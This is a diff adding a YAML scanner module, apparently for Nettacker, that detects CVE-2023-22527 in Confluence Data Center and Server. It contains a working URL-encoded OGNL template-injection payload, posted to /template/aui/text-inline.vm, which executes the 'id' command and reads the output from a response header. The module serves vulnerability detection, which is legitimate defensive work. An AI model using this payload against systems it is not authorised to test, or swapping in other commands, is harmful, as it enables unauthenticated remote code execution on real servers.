@@ -1,0 +1,50 @@
+info:
+  name: confluence_cve_2023_22527_vuln
+  author: Jimmy Ly
+  severity: 10
+  description: A template injection vulnerability on out-of-date versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected version. 
+  reference: 
+    - https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
+    - https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-22527
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve
+    - confluence
+    - atlassian
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Accept-Encoding: gzip, deflate, br
+          Content-Type: application/x-www-form-urlencoded
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/template/aui/text-inline.vm"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: label=aaa%5Cu0027%2B%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.x%5B0%5D%2C%7B%7D%29%2B%5Cu0027&x=%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%5Cu0027X-Cmd-Response%5Cu0027%2C%28new+freemarker.template.utility.Execute%28%29%29.exec%28%7B%22id%22%7D%29%29
+        response:
+          condition_type: and
+          conditions:
+            headers:
+              X-Cmd-Response:
+                regex: (.+)$
+                reverse: false
